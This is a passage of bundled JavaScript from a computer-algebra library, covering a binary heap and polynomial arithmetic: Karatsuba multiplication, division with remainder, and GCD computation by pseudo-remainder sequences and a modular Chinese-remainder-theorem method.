                trigonometryFunctions[denotation] = true;
              }
            }
          }
        }
      }
    }
  };

  self.ExpressionParser = ExpressionParser;

})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */

//(function (exports) {
  //"use strict";

  function Heap(compareTo) {
    this.data = [];
    this.compareTo = compareTo;
  }

  Heap.prototype.push = function (value) {
    var data = this.data;
    var compareTo = this.compareTo;
    data.push(value);
    // bubbleUp(size - 1)
    var size = data.length;
    var j = size - 1;
    var tmp = data[j];
    var parent = -1;
    while (j > 0 && compareTo(tmp, data[parent = Math.floor((j - 1) / 2)]) < 0) {
      data[j] = data[parent];
      j = parent;
    }
    data[j] = tmp;
  };
  
  Heap.prototype.pop = function () {
    var data = this.data;
    var compareTo = this.compareTo;
    var size = data.length;
    if (size === 0) {
      return undefined;
    }
    if (size === 1) {
      return data.pop();
    }
    var value = data[0];
    data[0] = data.pop();
    --size;
    // bubbleDown(0)
    var j = 0;
    if (j < size) {
      var tmp = data[j];
      do {
        var child = size;
        var t = tmp;
        var c = j * 2;
        if (++c < size && compareTo(data[c], t) < 0) {
          child = c;
          t = data[child];
        }
        if (++c < size && compareTo(data[c], t) < 0) {
          child = c;
          t = data[child];
        }
        data[j] = t;
        j = child;
      } while (j < size);
    }
    return value;
  };

  Heap.prototype.peek = function () {
    var data = this.data;
    return data.length > 0 ? data[0] : undefined;
  };

  Heap.prototype.size = function () {
    var data = this.data;
    return data.length;
  };

  Heap.prototype.replace = function (newItem) {
    this.data.push(newItem);
    return this.pop();
  };

  //exports.Heap = Heap;

//}(this));
self.Heap = Heap;

})();
(function () {
"use strict";
/*global hit*/
// Transformation methods:
//   Polynomial#_exponentiateRoots(n) (Î±_1 = Î±**n or x = x_1**(1/n)) - ? - throws when cannot do it (?)
//   Polynomial#_scaleRoots(s) (Î±_1 = Î± * s or x = x_1 / s)
//   Polynomial#_translateRoots(h) (Î±_1 = Î± + h or x = x_1 - h)



 //



var isPrime = primeFactor._isPrime; //var freeze = Object.freeze; - too slow

var freeze = function (x) { return x; }; // similar to https://developer.android.com/reference/android/util/SparseArray


function PolynomialData(length) {
  this.degrees = new Array(length);
  this.coefficients = new Array(length);
  this.size = 0; // public
}

PolynomialData.prototype.add = function (degree, coefficient) {
  var k = this.size;

  if (!(Math.floor(degree) === degree && degree >= 0 && degree <= Number.MAX_SAFE_INTEGER)) {
    throw new RangeError("NotSupportedError");
  }

  if (k > 0 && !(degree < this.degrees[k - 1]) || k >= this.degrees.length || k >= this.coefficients.length) {
    throw new RangeError();
  }

  this.degrees[k] = degree;
  this.coefficients[k] = coefficient;
  this.size = k + 1;
};

PolynomialData.prototype.degree = function (i) {
  return this.degrees[i];
};

PolynomialData.prototype.coefficient = function (i) {
  return this.coefficients[i];
};

PolynomialData.prototype.trim = function () {
  if (this.size < Math.max(this.degrees.length, this.coefficients.length)) {
    this.degrees.length = this.size;
    this.coefficients.length = this.size;
  }

  return this;
}; // Polynomial([a0, a1, a2, ...., an]);
// an*x^n+ an-1 x ^n-1 +... + a0


function Polynomial(a) {
  this.a = a.trim();
}

Polynomial.of = function () {
  var newData = new PolynomialData(arguments.length);

  for (var i = arguments.length - 1; i >= 0; i -= 1) {
    var a = arguments[i];

    if (!a.equals(Expression.ZERO)) {
      newData.add(i, a);
    }
  }

  return new Polynomial(newData);
};

Polynomial.from = function (array) {
  var newData = new PolynomialData(array.length);

  for (var i = array.length - 1; i >= 0; i -= 1) {
    var degree = i;
    var coefficient = array[i];

    if (!coefficient.equals(Expression.ZERO)) {
      newData.add(degree, coefficient);
    }
  }

  return new Polynomial(newData);
};

Polynomial.ZERO = Polynomial.of();

Polynomial.prototype.getDegree = function () {
  return this.a.size === 0 ? -1 : this.a.degree(0);
};

Polynomial.prototype.getCoefficient = function (degree) {
  var from = 0;
  var to = this.a.size;

  while (from < to) {
    var middle = from + Math.floor((to - from) / 2);
    var y = this.a.degree(middle);

    if (y > degree) {
      from = middle + 1;
    } else if (y < degree) {
      to = middle;
    } else {
      return this.a.coefficient(middle);
    }
  }

  return Expression.ZERO;
};

Polynomial.prototype.getLeadingCoefficient = function () {
  return this.a.size === 0 ? Expression.ZERO : this.a.coefficient(0);
};

Polynomial.prototype.map = function (mapFunction) {
  //?
  if (mapFunction.length !== 1) {
    throw new RangeError("deprecated");
  }

  var newData = new PolynomialData(this.a.size);

  for (var i = 0; i < this.a.size; i += 1) {
    var degree = this.a.degree(i);
    var coefficient = this.a.coefficient(i);
    var c = mapFunction(coefficient);

    if (!c.equals(Expression.ZERO)) {
      newData.add(degree, c);
    }
  }

  return new Polynomial(newData);
};

Polynomial.prototype.equals = function (p) {
  if (p === Expression.ZERO) {
    return this.a.size === 0;
  }

  if (this.a.size !== p.a.size) {
    return false;
  }

  var i = 0;
  var j = 0;

  while (i < this.a.size && j < p.a.size) {
    if (this.a.degree(i) !== p.a.degree(j) || !this.a.coefficient(i).equals(p.a.coefficient(j))) {
      return false;
    }

    i += 1;
    j += 1;
  }

  return true;
}; // mapFunction(0, 0) === 0


function _join(A, B, mapFunction) {
  var newData = new PolynomialData(A.a.size + B.a.size);
  var i = -1;
  var x = -2;
  var xc = Expression.ZERO;
  var j = -1;
  var y = -2;
  var yc = Expression.ZERO;

  while (x !== -1 || y !== -1) {
    var d = Math.max(x, y);

    if (d !== -2) {
      //var c = x > y ? xc : (y > x ? yc : xc.add(yc));
      var c = mapFunction(x >= y ? xc : Expression.ZERO, y >= x ? yc : Expression.ZERO);

      if (x !== y || !c.equals(Expression.ZERO)) {
        newData.add(d, c);
      }
    }

    if (x === d) {
      i += 1;

      if (i < A.a.size) {
        x = A.a.degree(i);
        xc = A.a.coefficient(i);
      } else {
        x = -1;
        xc = Expression.ZERO;
      }
    }

    if (y === d) {
      j += 1;

      if (j < B.a.size) {
        y = B.a.degree(j);
        yc = B.a.coefficient(j);
      } else {
        y = -1;
        yc = Expression.ZERO;
      }
    }
  }

  return new Polynomial(newData);
}

Polynomial.prototype.add = function (p) {
  if (p.a.size === 0) {
    return this;
  }

  if (this.a.size === 0) {
    return p;
  }

  return _join(this, p, function (xc, yc) {
    if (xc === Expression.ZERO) {
      return yc;
    }

    if (yc === Expression.ZERO) {
      return xc;
    }

    return xc.add(yc);
  });
};

function split_at(p, d) {
  var tmp = p.divideAndRemainder(Polynomial.of(Expression.ONE).shift(d));
  return [tmp.quotient, tmp.remainder];
}

var KARATSUBA_THRESHOLD = 17; // https://en.wikipedia.org/wiki/Karatsuba_algorithm#Pseudocode

function karatsuba(p1, p2) {
  if (p1.a.size < KARATSUBA_THRESHOLD || p2.a.size < KARATSUBA_THRESHOLD) {
    return p1.multiply(p2);
  }
  /* Calculates the size of the numbers. */


  var m = Math.min(p1.a.size, p2.a.size);
  var m2 = (p2.a.size <= p1.a.size ? p2 : p1).a.degree(Math.floor(m / 2));
  /* var m2 = Math.ceil(m / 2) will also work */

  /* Split the digit sequences in the middle. */

  var $tmphigh1_low1 = split_at(p1, m2);
  var high1 = $tmphigh1_low1[0];
  var low1 = $tmphigh1_low1[1];
  var $tmphigh2_low2 = split_at(p2, m2);
  var high2 = $tmphigh2_low2[0];
  var low2 = $tmphigh2_low2[1];
  /* 3 calls made to numbers approximately half the size. */

  var z0 = karatsuba(low1, low2);
  var z1 = karatsuba(low1.add(high1), low2.add(high2));
  var z2 = karatsuba(high1, high2);
  return z2.shift(m2 * 2).add(z1.subtract(z2).subtract(z0).shift(m2)).add(z0);
}

function multiplyInternal(A, B, fromLeft) {
  var npmp1 = A.getDegree() + B.getDegree() + 1;

  if ((A.a.size + B.a.size + Math.min(A.a.size, B.a.size)) * 4 >= npmp1) {
    // "dense"
    var result = new Array(npmp1).fill(Expression.ZERO);

    for (var i = 0; i < A.a.size; i += 1) {
      var d = A.a.degree(i);
      var c = A.a.coefficient(i);

      for (var j = 0; j < B.a.size; j += 1) {
        var bd = B.a.degree(j);
        var bj = B.a.coefficient(j);
        var degree = d + bd;
        var coefficient = fromLeft ? c.multiply(bj) : bj.multiply(c);
        result[degree] = result[degree].add(coefficient);
      }
    }

    return Polynomial.from(result);
  } else {
    var result = new FastAdditionPolynomial();

    for (var i = 0; i < A.a.size; i += 1) {
      var d = A.a.degree(i);
      var c = A.a.coefficient(i);
      result.add(c, d, B, fromLeft);
    }

    return result.toPolynomial();
  }
}

Polynomial.prototype.multiply = function (p) {
  if (this.a.size === 0 || p.a.size === 0) {
    return Polynomial.ZERO;
  }

  if (p.a.size === 1 && p.a.coefficient(0) instanceof Expression.Integer) {
    // commutative multiplication
    return this.shift(p.a.degree(0)).scale(p.a.coefficient(0));
  }

  if (p.a.size >= KARATSUBA_THRESHOLD && this.a.size >= KARATSUBA_THRESHOLD) {
    //debugger;
    //console.count('KARATSUBA_THRESHOLD');
    return karatsuba(this, p);
  }

  if (this.a.size <= p.a.size) {
    return multiplyInternal(this, p, true);
  } else {
    return multiplyInternal(p, this, false);
  }
};

Polynomial.prototype.shift = function (n) {
  // *= x**n, n >= 0
  if (!(n >= 0)) {
    throw new TypeError();
  }

  if (n === 0) {
    return this;
  }

  var newData = new PolynomialData(this.a.size);

  for (var i = 0; i < this.a.size; i += 1) {
    newData.add(this.a.degree(i) + n, this.a.coefficient(i));
  }

  return new Polynomial(newData);
}; //note: no Map is needed


function FastAdditionPolynomial() {
  // see http://www.cecm.sfu.ca/~mmonagan/teaching/TopicsinCA11/johnson.pdf
  // see https://en.wikipedia.org/wiki/K-way_merge_algorithm#Heap
  this.maxHeap = new Heap(function (a, b) { return b.degree - a.degree; });
  this.degree = -1;
  this.leadingCoefficient = Expression.ZERO;
}

FastAdditionPolynomial.prototype.add = function (scale, shift, polynomial, fromLeft) {
  var i = 0;
  var iterator = {
    next: function () {
      if (i === polynomial.a.size) {
        return undefined;
      }

      var d = polynomial.a.degree(i);
      var c = polynomial.a.coefficient(i);
      i += 1;
      return freeze({
        degree: d + shift,
        coefficient: c === Expression.ONE ? scale : scale === Expression.ONE ? c : fromLeft ? scale.multiply(c) : c.multiply(scale),
        iterator: iterator
      });
    }
  };
  var newEntry = iterator.next();

  if (newEntry.degree > this.degree && this.degree !== -1) {
    throw new RangeError();
  } else if (newEntry.degree < this.degree) {
    this.maxHeap.push(newEntry);
  } else {
    if (this.degree === -1) {
      this.leadingCoefficient = newEntry.coefficient;
      this.degree = newEntry.degree;
    } else {
      this.leadingCoefficient = this.leadingCoefficient.add(newEntry.coefficient);
    }

    newEntry = newEntry.iterator.next();

    if (newEntry != undefined) {
      this.maxHeap.push(newEntry);
    } // Computation of the leading coefficient:


    while (this.maxHeap.size() > 0 && (this.degree === this.maxHeap.peek().degree || this.leadingCoefficient.equals(Expression.ZERO))) {
      var tmp = this.maxHeap.peek();
      this.leadingCoefficient = this.leadingCoefficient.add(tmp.coefficient);
      this.degree = tmp.degree;
      var next = tmp.iterator.next();

      if (next != undefined) {
        //this.maxHeap.pop();
        //this.maxHeap.push(next);
        this.maxHeap.replace(next);
      } else {
        this.maxHeap.pop();
      }
    }

    if (this.maxHeap.size() === 0 && this.leadingCoefficient.equals(Expression.ZERO)) {
      this.degree = -1;
    }
  }
};

FastAdditionPolynomial.prototype.getDegree = function () {
  return this.degree;
};

FastAdditionPolynomial.prototype.getLeadingCoefficient = function () {
  return this.leadingCoefficient;
};

FastAdditionPolynomial.prototype.toPolynomial = function () {
  var terms = [];
  var ONE = Polynomial.of(Expression.ONE);

  while (this.getDegree() >= 0) {
    var degree = this.getDegree();
    var coefficient = this.getLeadingCoefficient();
    this.add(coefficient.negate(), degree, ONE, true);
    terms.push({
      degree: degree,
      coefficient: coefficient
    });
  }

  return Polynomial.fromTerms(terms);
};

Polynomial.prototype.divideAndRemainder = function (p, w, callback0) {
  w = w || undefined;

  if (p.equals(Polynomial.ZERO)) {
    throw new TypeError("ArithmeticException");
  }

  if (this.getDegree() < p.getDegree()) {
    return {
      quotient: Polynomial.ZERO,
      remainder: this
    };
  }

  if (p.a.size === 1 && p.a.coefficient(0).equals(Expression.ONE) && (w == undefined || this._hasIntegerLikeCoefficients())) {
    //TODO: !!!
    if (p.a.degree(0) === 0) {
      return {
        quotient: this,
        remainder: Polynomial.ZERO
      };
    }

    var s = p.a.degree(0);
    var k = 0;

    while (this.a.degree(k) >= s && k < this.a.size) {
      k += 1;
    }

    var q = new PolynomialData(k);

    for (var i = 0; i < k; i += 1) {
      q.add(this.a.degree(i) - s, this.a.coefficient(i));
    }

    var r = new PolynomialData(this.a.size - k);

    for (var i = k; i < this.a.size; i += 1) {
      r.add(this.a.degree(i), this.a.coefficient(i));
    }

    return {
      quotient: new Polynomial(q),
      remainder: new Polynomial(r)
    };
  }

  var lcp = p.getLeadingCoefficient();
  var lcpInv = lcp instanceof Expression.ExpressionWithPolynomialRoot ? lcp.inverse() : undefined; // TODO: ?

  if (p.a.size === 1 && p.a.degree(0) === 0 && lcpInv == undefined && (w == undefined || w === "throw")) {
    return {
      quotient: this.map(function (c) {
        var q = c.divide(lcp);

        if (w != undefined) {
          if (q instanceof Expression.Division) {
            throw new RangeError(); // AssertionError
          }
        }

        return q;
      }),
      remainder: Polynomial.ZERO
    };
  }

  var quotient = [];
  var isSparse = this.a.size / this.getDegree() < 1 / 4 && callback0 == undefined; //TODO: ?

  var remainder = this;

  if (isSparse) {
    remainder = new FastAdditionPolynomial();
    remainder.add(Expression.ONE, 0, this, true);
  }

  var minusP = p.negate();

  while (remainder.getDegree() >= p.getDegree()) {
    var n = remainder.getDegree() - p.getDegree();
    var lcr = remainder.getLeadingCoefficient();
    var q = lcpInv == undefined ? lcr.divide(lcp) : lcr.multiply(lcpInv);

    if (callback0 != undefined) {
      q = callback0(q);
    }

    if (w != undefined) {
      if (q instanceof Expression.Division) {
        if (w === "throw") {
          throw new TypeError(this.toString() + " " + p.toString()); // AssertionError
        } else if (w === "undefined") {
          return undefined;
        } else {
          throw new TypeError();
        }
      }
    } //TODO: optimize - ?


    quotient.push({
      degree: n,
      coefficient: q
    }); //TODO: optimize - ?

    if (isSparse) {
      remainder.add(q, n, minusP, true);
    } else {
      if (!(q instanceof Expression.Integer)) {
        remainder = remainder.add(Polynomial.of(q).shift(n).multiply(minusP));
      } else {
        remainder = remainder.add(minusP.shift(n).scale(q));
      }
    }

    if (callback0 != undefined) {
      while (remainder.getDegree() >= 0 && callback0(remainder.getLeadingCoefficient()).equals(Expression.ZERO)) {
        remainder = remainder.subtract(Polynomial.of(remainder.getLeadingCoefficient()).shift(remainder.getDegree()));
      }
    }

    if (remainder.getDegree() - p.getDegree() === n) {
      // to avoid the infite loop
      throw new TypeError("there is a some problem with the expression evaluation"); //!
    }
  }

  if (isSparse) {
    remainder = remainder.toPolynomial();
  }

  return {
    quotient: Polynomial.fromTerms(quotient),
    remainder: remainder
  };
};

Polynomial.prototype.divideAndRemainderModP = function (divisor, p) {
  var divisorLeadingCoefficient = divisor.getLeadingCoefficient();

  if (!(divisorLeadingCoefficient instanceof Expression.Polynomial) && !divisorLeadingCoefficient.equals(Expression.ONE) || divisorLeadingCoefficient instanceof Expression.Polynomial && divisorLeadingCoefficient.polynomial.getDegree() !== 0) {
    throw new RangeError();
  }

  var tmp = this.divideAndRemainder(divisor, "throw", function (c) { return c.modulo(p); });
  return {
    quotient: tmp.quotient,
    remainder: tmp.remainder.mod(p)
  };
};

Polynomial.pseudoRemainder = function (A, B) {
  var d = A.getDegree() - B.getDegree(); // assertion

  if (d < 0) {
    throw new RangeError();
  }

  return A.scale(B.getLeadingCoefficient()._pow(d + 1)).divideAndRemainder(B, "throw").remainder;
};

Polynomial.polynomialGCD = function (a, b) {
  var g = Math.gcd(a.getGCDOfTermDegrees(), b.getGCDOfTermDegrees());

  if (g > 1) {
    return Polynomial.polynomialGCD(a._exponentiateRoots(g), b._exponentiateRoots(g))._exponentiateRoots(1 / g);
  } //!optimization 2021-03-15


  if (b.getDegree() > 0 && a.getDegree() > 0) {
    var ctz = function (p) {
      var i = 0;

      while (p.getCoefficient(i).equals(Expression.ZERO)) {
        i += 1;
      }

      return i;
    };

    var i = ctz(b);
    var j = ctz(a);

    if (i !== 0 || j !== 0) {
      //TODO: optimize (?)
      return Polynomial.polynomialGCD(a.divideAndRemainder(Polynomial.of(Expression.ONE).shift(j), undefined).quotient, b.divideAndRemainder(Polynomial.of(Expression.ONE).shift(i), undefined).quotient).shift(Math.min(i, j));
    }
  } //!
  //TODO: fix (place condition for degrees earlier - ?)


  if (a.getDegree() < b.getDegree()) {
    //!!!
    var tmp = a;
    a = b;
    b = tmp;
  }

  if (b.equals(Polynomial.ZERO)) {
    return a;
  } //!


  if (a.getDegree() === 1 && b.getDegree() === 0) {
    return Polynomial.of(b.getCoefficient(0).gcd(a.getCoefficient(0)).gcd(a.getCoefficient(1))); //?
  } //!


  var contentA = a.getContent();
  var contentB = b.getContent();
  var ppA = a.divideAndRemainder(Polynomial.of(contentA), "throw").quotient;
  var ppB = b.divideAndRemainder(Polynomial.of(contentB), "throw").quotient;
  var ppGCD = gcdOfPrimitivePolynomials(ppA, ppB);
  var contentGCD = contentA.gcd(contentB);
  return Polynomial.of(contentGCD).multiply(ppGCD);
};

function hasQuadraticInteger(c) {
  if (c instanceof Expression.NthRoot) {
    return !(c instanceof Expression.Integer);
  }

  if (c instanceof Expression.ExponentiationOfMinusOne) {
    return true; //TODO: RENAME or remove, add a test, other classes
  }

  if (c instanceof Expression.BinaryOperation) {
    return hasQuadraticInteger(c.a) || hasQuadraticInteger(c.b);
  } //if (c instanceof Expression.ExpressionWithPolynomialRoot) {//TODO: rename function or remove (?)
  //  return true;
  //}


  if (c instanceof Expression.Integer || c instanceof Expression.Symbol || c instanceof Expression.Complex) {
    return false;
  } //console.debug(c);//?


  return false;
}
/*

    if (!a._hasIntegerLikeCoefficients() || !b._hasIntegerLikeCoefficients()) {
      var g = gcdOfPrimitivePolynomials(a, b);
      g = g.scale(g.getLeadingCoefficient().inverse()).primitivePart();
      return g;//TODO: rename, change, ..., check - ?
    }

    if (B.getDegree() > 0) {
      var g1 = gcdUsingPseudoRemainderSequence(A, B, "subresultant");//?
      return g1.scale(g1.getLeadingCoefficient().inverse()).primitivePart();//?
    }

*/
//TODO: ? 


var getY = function (p, other) {
  var visited = {};

  for (var i = 0; i < p.a.size; i++) {
    var c = p.a.coefficient(i);
    var v = Expression.getVariable(c, {
      avoidNthRoots: true
    });

    if (v != null) {
      if (v instanceof Expression.ExpressionWithPolynomialRoot) {
        //debugger;
        return null; //!?
      }

      if (Expression.isConstant(v) && v !== Expression.E && v !== Expression.PI) {
        //?
        //debugger;
        return null;
      }

      if (v instanceof Expression.Polynomial) {
        return null; //!?
      } //if (v instanceof Expression.Addition) { //TODO: replacement - ?
      //  v = null;
      //}


      if (v instanceof Expression.Symbol) {
        if (visited[v.symbol]) {
          v = null;
        } else {
          visited[v.symbol] = true;
        }
      }

      for (var j = 0; j < p.a.size && v != null; j += 1) {
        if (!Expression._getReplacement(p.a.coefficient(j), v).equals(v)) {
          v = null;
        }
      }

      for (var j = 0; j < other.a.size && v != null; j += 1) {
        if (!Expression._getReplacement(other.a.coefficient(j), v).equals(v)) {
          v = null;
        }
      }

      if (v != null) {
        return v;
      }
    }
  }

  return null;
};

Polynomial._getY = getY;

function gcdOfPrimitivePolynomials(A, B) {
  console.assert(A.getDegree() >= B.getDegree()); //if (B.getDegree() === 1) {
  //  return A.divideAndRemainder(B).remainder.equals(Polynomial.ZERO) ? B : Polynomial.of(Expression.ONE);
  //}
  //TODO: for rings - ?

  if (A.hasIntegerCoefficients() && B.hasIntegerCoefficients() && B.getDegree() > 2) {
    if (A.isDivisibleBy(B)) {
      return B;
    }

    return gcdByModularAlgorithm(A, B);
  } //TODO: 
  //if (A._hasIntegerLikeCoefficients() && B._hasIntegerLikeCoefficients() && B.getDegree() > 2) {


  if (B.getDegree() > 1) {
    if (getY(A, B) != null || getY(B, A) != null) {
      return gcdByMultivariateModularAlgorithm(A, B);
    }
  } //}


  if (B.getDegree() > 2) {
    //TODO: why isn't it working or slow for other cases - ?
    return gcdUsingPseudoRemainderSequence(A, B, "subresultant").primitivePart();
  } //TODO:
  //if (isUniqueFactorizationDomain()) {


  if (!A._testCoefficients(function (c) { return hasQuadraticInteger(c); }) && !B._testCoefficients(function (c) { return hasQuadraticInteger(c); }) && B.getDegree() > 0) {
    //TODO: REMOVE
    return gcdUsingPseudoRemainderSequence(A, B, "primitive");
  } //}


  if (B.getDegree() === 0) {
    return Polynomial.of(Expression.ONE);
  }

  return gcdUsingRemainderSequence(A, B).primitivePart();
}

function gcdUsingRemainderSequence(A, B) {
  while (!B.equals(Polynomial.ZERO)) {
    var R = A.divideAndRemainder(B).remainder;
    A = B;
    B = R;
  }

  return A;
}

function gcdUsingPseudoRemainderSequence(A, B, type) {
  var g = Math.gcd(A.getGCDOfTermDegrees(), B.getGCDOfTermDegrees());

  if (g > 1) {
    console.error('g > 1');
    return gcdUsingPseudoRemainderSequence(A._exponentiateRoots(g), B._exponentiateRoots(g), type)._exponentiateRoots(1 / g);
  }

  for (var iteratortmp = Polynomial._pseudoRemainderSequence(A, B, type)[globalThis.Symbol.iterator](), tmp = iteratortmp.next().value; tmp != null; tmp = iteratortmp.next().value) {
    var newR = tmp.R;
    A = B;
    B = newR;
  }

  var lastNonzeroRemainder = A;
  return lastNonzeroRemainder;
}

Polynomial._gcdUsingPseudoRemainderSequence = gcdUsingPseudoRemainderSequence;

function ChineseRemainderTheorem(m1, m2) {
  // https://en.wikipedia.org/wiki/Chinese_remainder_theorem#Case_of_two_moduli
  // x = r1 (mod m1)
  // x = r2 (mod m2)
  var c = m1.remainder(m2).modInverse(m2);
  return function (r1, r2) {
    return r1.add(r2.subtract(r1.modulo(m2)).multiply(c).modulo(m2).multiply(m1));
  };
}

globalThis.ChineseRemainderTheorem = ChineseRemainderTheorem; //TODO: REMOVE

/*
 var i = Expression.Integer.fromNumber;
 console.assert(ChineseRemainderTheorem(i(36), i(1), i(119), i(23)).equals(i(2416)));
*/

function ChineseRemainderTheoremForPolynomialCoefficients(p1, p2, m1, m2) {
  var solution = ChineseRemainderTheorem(m1, m2);
  return _join(p1, p2, function (r1, r2) { return solution(r1, r2); });
}

globalThis.ChineseRemainderTheoremForPolynomialCoefficients = ChineseRemainderTheoremForPolynomialCoefficients;

Polynomial.prototype._exponentiateRoots = function (n) {
  // Î± = Î±**n
  if (n === -1) {
    if (this.getCoefficient(0).equals(Expression.ZERO)) {
      throw new RangeError();
    }

    var newData = new PolynomialData(this.a.size);

    for (var j = this.a.size - 1; j >= 0; j -= 1) {
      newData.add(this.getDegree() - this.a.degree(j), this.a.coefficient(j));
    }

    var p = new Polynomial(newData);

    if (p.getLeadingCoefficient() instanceof Expression.Integer && p.getLeadingCoefficient().sign() < 0) {
      //TODO: ?
      p = p.negate(); //!!!
    }

    return p;
  }

  var inv = Math.floor(1 / n + 0.5);

  if (Math.floor(n) === n && n >= 2 || 1 / inv === n && inv >= 2) {
    var newData = new PolynomialData(this.a.size);

    for (var i = 0; i < this.a.size; i += 1) {
      if (Math.floor(n) === n && this.a.degree(i) % n !== 0) {
        throw new RangeError(); //?
      }

      newData.add(Math.floor(n) === n ? this.a.degree(i) / n : this.a.degree(i) * inv, this.a.coefficient(i));
    }

    return new Polynomial(newData);
  }

  throw new RangeError(n);
};

Polynomial.prototype._scaleRoots = function (s) {
  var sn = s.getNumerator();
  var sd = s.getDenominator();
  var d = this.getDegree();
  var lastScale = Expression.ONE;
  var lastScaleDegree = 0;
  var newData = new PolynomialData(this.a.size);

  for (var i = 0; i < this.a.size; i += 1) {
    var degree = this.a.degree(i);
    var coefficient = this.a.coefficient(i);
    lastScale = lastScale.multiply(sn._pow(d - degree - lastScaleDegree));
    lastScaleDegree = d - degree;
    newData.add(degree, lastScale.multiply(sd._pow(degree)).multiply(coefficient));
  }

  return new Polynomial(newData);
};

Polynomial.prototype._translateRoots = function (h) {
  // Î± = Î± + h
  if (h.equals(Expression.ONE.negate())) {
    //return this.map(function (c) { return Polynomial.of(c); }).calcAt(Polynomial.of(Expression.ONE, Expression.ONE));
    // The Art of Computer Science by Donald Knuth, Volume 2, page 489:
    var u = this;
    var n = u.getDegree();
    var v = new Array(n + 1);

    for (var j = 0; j <= n; j += 1) {
      v[j] = u.getCoefficient(j);
    }

    for (var k = 0; k <= n - 1; k += 1) {
      for (var j = n - 1; j >= k; j -= 1) {
        v[j] = v[j].add(v[j + 1]);
      }
    }

    return Polynomial.from(v);
  }

  if (h.equals(Expression.ZERO)) {
    return this;
  }

  var v = h.getNumerator()._pow(this.getDegree());

  return this._scaleRoots(h.negate().inverse())._translateRoots(Expression.ONE.negate())._scaleRoots(h.negate()).map(function (c) { return c.divide(v); });
};

Polynomial.prototype.mod = function (m) {
  return this.map(function (c) { return c.modulo(m); });
};

Polynomial.prototype.mod2 = function (m) {
  //return this.map(function (c) { return c.roundMod(m); });
  return this.mod(m).map(function (c) { return c.subtract(m).add(c).compareTo(Expression.ZERO) < 0 ? c : c.subtract(m); });
}; //TODO: ???


Polynomial.prototype._pow = function (count) {
  var pow = function (x, count, accumulator) {
    if (count < 0) {
      throw new RangeError();
    }

    if (count > Number.MAX_SAFE_INTEGER) {
      throw new RangeError("NotSupportedError");
    }

    return count < 1 ? accumulator : 2 * Math.floor(count / 2) !== count ? pow(x, count - 1, accumulator.multiply(x)) : pow(x.multiply(x), Math.floor(count / 2), accumulator);
  }; //throw new Error();//TODO: ?


  return pow(this, count, Polynomial.of(Expression.ONE));
};

function gcdByModularAlgorithm(a, b) {
  if (true) {
    var g = Math.gcd(a.getGCDOfTermDegrees(), b.getGCDOfTermDegrees());

    if (g > 1) {
      console.debug('g > 1');
      return gcdByModularAlgorithm(a._exponentiateRoots(g), b._exponentiateRoots(g))._exponentiateRoots(1 / g);
    }
  } //! https://www3.risc.jku.at/education/courses/ws2011/ca/3-gcd.pdf


  var d = a.getLeadingCoefficient().abs().gcd(b.getLeadingCoefficient().abs());

  if (a.getCoefficient(0).equals(Expression.ZERO) || b.getCoefficient(0).equals(Expression.ZERO)) {
    throw new RangeError();
  }

  if (d.compareTo(a.getCoefficient(0).abs().gcd(b.getCoefficient(0).abs())) > 0) {
    //?
    return gcdByModularAlgorithm(a._exponentiateRoots(-1), b._exponentiateRoots(-1))._exponentiateRoots(-1);
  }

  console.assert(a.hasIntegerCoefficients() && a.getContent().abs().equals(Expression.ONE) && a.getDegree() > 0);
  console.assert(b.hasIntegerCoefficients() && b.getContent().abs().equals(Expression.ONE) && b.getDegree() > 0);
  var maxGCDDegree = Math.min(a.getDegree(), b.getDegree());

  var bound = function () {
    var maxGCDLeadingCoefficient = d; //TODO: not necessary to use power of two

    var logarithmOfCoefficientBound = Math.min(a._log2OfBoundForCoefficientsOfFactor(maxGCDDegree, maxGCDLeadingCoefficient), b._log2OfBoundForCoefficientsOfFactor(maxGCDDegree, maxGCDLeadingCoefficient)); //TODO: multiply by gcd of leading coefficients (?)

    return Expression.TWO._pow(1 + Math.ceil(logarithmOfCoefficientBound));
  };

  var M = bound(); //if (M === 1 / 0) {
  //  return gcdUsingPrimitivePseudoRemainderSequence(a, b);//TODO: !!!
  //}

  var p = Expression.Integer.fromBigInt(Math.min(Math.max(M.toNumber(), 1024), Math.floor(Math.sqrt((Number.MAX_SAFE_INTEGER + 1) / (1 + Math.min(a.getDegree(), b.getDegree())))))); // TODO: should we divide on n - ?
  //var p = Expression.Integer.fromNumber(3);//TODO: remove

  var counter = 0;

  while (true) {
    var g = null;
    var P = Expression.ZERO;

    while (P.compareTo(M) < 0) {
      counter += 1;

      if (counter > 50 && p._pow(counter - 50).compareTo(M) >= 0) {
        throw new TypeError("!!!");
      }

      do {
        p = p.subtract(Expression.ONE);
      } while (!isPrime(p.toBigInt()) || d.remainder(p).equals(Expression.ZERO));

      var cp = factorizeOverTheIntegers._gcdOfPolynomialsOverFiniteField0(a, b, p.toBigInt());

      console.assert(cp.getLeadingCoefficient().equals(Expression.ONE));
      var gp = cp.scale(d.remainder(p)).mod(p); //TODO: should it do .mod(p) ? as the book does not tell this

      if (gp.getDegree() < 1) {
        return Polynomial.of(Expression.ONE);
      }

      if (gp.getDegree() > 2 / 3 * a.getDegree()) {// see Donald Knuth's book
        //TODO: ?
        //return gcdOfPrimitivePolynomials(a, b);
      }

      if (gp.getDegree() > maxGCDDegree) {
        continue;
      }

      if (g != null && gp.getDegree() < g.getDegree()) {
        g = null; // g was wrong
      }

      if (g == null) {
        g = gp.mod2(p);
        P = p;
        maxGCDDegree = gp.getDegree();
        M = bound();
      } else if (gp.getDegree() === g.getDegree()) {
        //TODO: why ?
        var oldG = g;
        g = ChineseRemainderTheoremForPolynomialCoefficients(g, gp, P, p);
        P = P.multiply(p);
        g = g.mod2(P); //does not work (?), the number of iteration is small anyway (?)

        if (P.compareTo(M) < 0 && oldG.equals(g)) {
          // optimization from the book:
          // "Whenever g remains unchanged for a series of iterations through the whileâ€“loop, we might apply the test in step (5) and exit if the outcome is positive."
          g = g.primitivePart(); // TODO: scale a and b instead (?) for the test

          if (a.isDivisibleBy(g) && b.isDivisibleBy(g)) {
            return g;
          }

          g = oldG; //TODO: ???
        } else {//debugger;
        }
      } //console.debug(counter, g.primitivePart().toString(), P.toString());

    }

    g = g.primitivePart(); // TODO: scale a and b instead (?) for the test

    if (a.isDivisibleBy(g) && b.isDivisibleBy(g)) {
      return g;
    }
  }
}

Polynomial._gcdByModularAlgorithm = gcdByModularAlgorithm;

function gcdByMultivariateModularAlgorithm(a, b) {
  if (true) {
    var g = Math.gcd(a.getGCDOfTermDegrees(), b.getGCDOfTermDegrees());

    if (g > 1) {
      console.debug('g > 1');
